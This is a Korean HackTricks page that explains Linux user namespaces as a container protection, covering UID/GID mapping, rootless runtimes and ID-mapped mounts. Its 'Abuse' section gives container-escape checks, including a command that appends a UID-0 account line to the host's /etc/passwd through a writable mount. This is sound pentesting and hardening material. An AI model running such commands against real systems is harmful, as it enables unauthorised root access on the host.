# 사용자 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

사용자 네임스페이스는 네임스페이스 내부에서 보이는 사용자 및 그룹 ID의 의미를 변경하여 커널이 이를 외부의 다른 ID로 매핑하도록 허용합니다. 이는 현대 컨테이너 보호 기능 중 가장 중요한 것들 중 하나로, 고전적 컨테이너의 가장 큰 역사적 문제를 직접적으로 해결합니다: **컨테이너 내부의 root가 호스트의 root와 지나치게 가까웠습니다**.

user namespaces를 사용하면 프로세스는 컨테이너 내부에서 UID 0으로 실행될 수 있지만 호스트에서는 권한이 낮은 UID 범위에 대응할 수 있습니다. 이는 해당 프로세스가 컨테이너 내부의 여러 작업에서는 root처럼 동작할 수 있지만 호스트 관점에서는 훨씬 덜 강력하다는 것을 의미합니다. 이것이 모든 컨테이너 보안 문제를 해결하지는 않지만, 컨테이너 침해의 결과를 크게 바꿉니다.

## 동작

사용자 네임스페이스는 `/proc/self/uid_map` 및 `/proc/self/gid_map` 같은 매핑 파일을 가지며, 이 파일들은 네임스페이스 ID가 상위 ID로 어떻게 변환되는지를 설명합니다. 네임스페이스 내부의 root가 권한이 낮은 호스트 UID에 매핑된다면, 실제 호스트 root를 필요로 하는 작업들은 그만큼의 영향을 주지 않습니다. 이것이 사용자 네임스페이스가 **rootless containers**의 핵심인 이유이며, 오래된 rootful container 기본 설정과 더 현대적인 최소 권한 설계 사이의 가장 큰 차이점 중 하나인 이유입니다.

요점은 미묘하지만 중요합니다: 컨테이너 내부의 root는 제거되는 것이 아니라 **변환**됩니다. 프로세스는 여전히 로컬에서는 root와 유사한 환경을 경험하지만, 호스트는 이를 완전한 root로 취급해서는 안 됩니다.

## 실습

수동 테스트는 다음과 같습니다:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
이렇게 하면 현재 사용자는 네임스페이스 내부에서는 root로 보이지만 네임스페이스 밖(호스트)에서는 여전히 host root가 아닙니다. 이는 user namespaces가 왜 그렇게 유용한지 이해하는 데 가장 간단하고 좋은 데모 중 하나입니다.

컨테이너에서는 다음과 같이 보이는 매핑을 비교해볼 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
정확한 출력은 엔진이 user namespace remapping을 사용 중인지, 아니면 전통적인 rootful 구성인지에 따라 달라집니다.

호스트 측에서 다음 명령으로 매핑을 읽을 수도 있습니다:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## 런타임 사용

Rootless Podman은 user 네임스페이스를 일급 보안 메커니즘으로 취급하는 가장 명확한 사례 중 하나이다. Rootless Docker 또한 이에 의존한다. Docker의 userns-remap 지원은 rootful 데몬 배포에서도 안전성을 향상시키지만, 역사적으로 많은 배포에서 호환성 문제로 이를 비활성화해 둔 경우가 많았다. Kubernetes의 user 네임스페이스 지원은 개선되었지만, 채택률과 기본값은 런타임, 배포판, 클러스터 정책에 따라 다르다. Incus/LXC 시스템도 UID/GID shifting과 idmapping 개념에 크게 의존한다.

전반적인 경향은 명확하다: user 네임스페이스를 진지하게 사용하는 환경은 사용하지 않는 환경보다 "컨테이너의 root가 실제로 무엇을 의미하는가?"에 대해 보통 더 나은 답을 제시한다.

## 고급 매핑 세부사항

권한 없는 프로세스가 `uid_map` 또는 `gid_map`에 쓸 때, 커널은 권한 있는 부모 네임스페이스 작성자가 쓸 때보다 더 엄격한 규칙을 적용한다. 허용되는 매핑은 제한적이며, `gid_map`의 경우 작성자는 보통 먼저 `setgroups(2)`를 비활성화해야 한다:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
이 세부사항은 rootless 실험에서 user-namespace 설정이 가끔 실패하는 이유와 런타임이 UID/GID 위임에 대해 신중한 보조 로직을 필요로 하는 이유를 설명하므로 중요하다.

Another advanced feature is the **ID-mapped mount**. 디스크상의 소유권을 변경하는 대신, ID-mapped mount는 마운트에 user-namespace 매핑을 적용하여 해당 마운트 뷰를 통해 소유권이 번역된 것처럼 보이게 한다. 이는 공유된 호스트 경로를 재귀적으로 `chown`할 필요 없이 사용할 수 있게 해주므로 rootless 및 현대적인 런타임 설정에서 특히 중요하다. 보안 측면에서 이 기능은 기저 파일시스템 메타데이터를 다시 쓰지 않더라도 네임스페이스 내부에서 bind mount가 어떻게 쓰기 가능해 보이는지를 변경한다.

마지막으로, 프로세스가 새 user namespace를 생성하거나 진입하면 해당 네임스페이스 내에서 전체 capability 세트를 받는다는 점을 기억하라. 이것이 곧 호스트 전체의 권한을 갑자기 얻는다는 뜻은 아니다. 해당 capability들은 네임스페이스 모델과 다른 보호 장치들이 허용하는 장소에서만 사용될 수 있다는 뜻이다. 이것이 `unshare -U`가 호스트의 루트 경계를 직접 사라지게 하지 않더라도 마운트나 네임스페이스-로컬 권한 작업을 갑자기 가능하게 할 수 있는 이유다.

## Misconfigurations

주요 약점은 가능한 환경에서 user namespaces를 단순히 사용하지 않는 것이다. 컨테이너의 root가 호스트 root에 너무 직접적으로 매핑되면, 쓰기 가능한 호스트 마운트와 권한 있는 커널 작업이 훨씬 더 위험해진다. 또 다른 문제는 호스트 user namespace 공유를 강제하거나 호환성을 위해 remapping을 비활성화하면서 그로 인해 신뢰 경계가 얼마나 크게 변하는지 인지하지 못하는 것이다.

User namespaces는 모델의 다른 부분들과 함께 고려되어야 한다. 활성화되어 있더라도, 폭넓은 런타임 API 노출이나 매우 취약한 런타임 설정은 다른 경로를 통해 권한 상승을 허용할 수 있다. 그러나 없을 경우 많은 오래된 탈출 클래스들이 훨씬 더 쉽게 악용될 수 있다.

## Abuse

컨테이너가 user namespace 분리 없이 rootful한 경우, 쓰기 가능한 호스트 바인드 마운트는 프로세스가 실제로 호스트 root로서 쓰기 작업을 할 수 있기 때문에 훨씬 더 위험해진다. 위험한 capabilities 역시 더 큰 의미를 가진다. 번역 경계(translation boundary)가 거의 존재하지 않기 때문에 공격자는 더 이상 그 경계를 극복하기 위해 많은 노력을 들일 필요가 없다.

컨테이너 탈출 경로를 평가할 때 user namespace의 존재 여부는 초기 단계에서 확인해야 한다. 이것이 모든 질문에 대한 답을 주지는 않지만, "컨테이너 내의 root"가 호스트에 직접적인 관련성이 있는지 여부를 즉시 보여준다.

가장 실용적인 악용 패턴은 매핑을 확인한 다음, 호스트에 마운트된 콘텐츠가 호스트 관련 권한으로 쓰기 가능한지를 즉시 테스트하는 것이다:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
파일이 실제 host root로 생성되면, 해당 경로에 대해 user namespace 격리가 사실상 존재하지 않는다. 그 시점에서 고전적인 host-file 악용이 현실화된다:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
라이브 평가에서 더 안전한 확인 방법은 중요한 파일을 수정하는 대신 무해한 마커를 작성하는 것입니다:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
이러한 검사들은 중요한데, 그 이유는 실제 질문에 빠르게 답해주기 때문이다: 이 container 안의 root가 host root에 충분히 가깝게 매핑되어 writable host mount가 즉시 host compromise path가 되는가?

### 전체 예제: Regaining Namespace-Local Capabilities

만약 seccomp가 `unshare`를 허용하고 환경이 새로운 user namespace를 허용한다면, 프로세스는 그 새 namespace 안에서 full capability set을 회복할 수 있다:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
이것 자체만으로는 host escape가 아닙니다. 중요한 이유는 user namespaces가 권한을 가진 네임스페이스 로컬 작업을 다시 활성화할 수 있고, 그런 작업들이 이후 약한 마운트, 취약한 커널, 또는 심하게 노출된 런타임 표면과 결합될 수 있기 때문입니다.

## 확인

이 명령들은 이 페이지에서 가장 중요한 질문에 답하기 위한 것입니다: 이 컨테이너 내부의 root가 호스트에서는 무엇에 매핑되는가?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
여기서 흥미로운 점:

- 프로세스가 UID 0이고 maps가 직접적이거나 매우 근접한 host-root mapping을 보여준다면, 해당 container는 훨씬 더 위험합니다.
- root가 unprivileged host range에 매핑된다면, 그것은 훨씬 더 안전한 기본 상태이며 보통 실제 user namespace isolation을 나타냅니다.
- mapping files는 `id`만으로보다 더 가치가 있습니다. 왜냐하면 `id`는 namespace-local identity만 보여주기 때문입니다.

workload가 UID 0으로 실행되고 mapping이 이것이 host root와 밀접하게 일치함을 보여준다면, container의 나머지 권한들은 훨씬 더 엄격하게 해석해야 합니다.
{{#include ../../../../../banners/hacktricks-training.md}}
